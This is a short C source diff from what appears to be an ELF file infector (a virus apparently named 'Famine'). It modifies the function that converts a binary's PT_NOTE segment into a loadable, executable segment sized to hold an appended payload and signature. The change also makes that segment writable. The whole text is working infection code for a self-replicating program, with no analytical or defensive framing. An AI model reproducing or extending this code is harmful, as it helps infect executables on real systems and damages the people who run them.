@@ -100,7 +100,7 @@ bool	change_note_segment(profiling *this, elf_data *data) {
 		return true;
 	
 	note->p_type   = PT_LOAD;
-	note->p_flags  = PF_R | PF_X | PF_FAMINE;
+	note->p_flags  = PF_R | PF_X | PF_W | PF_FAMINE;
 	note->p_filesz += this->size + SIGNATURE_OFFSET + SIGNATURE_LEN;
 	note->p_memsz  = note->p_filesz;
 	note->p_offset = data->original_size + 0x1000 - (data->original_size % 0x1000);
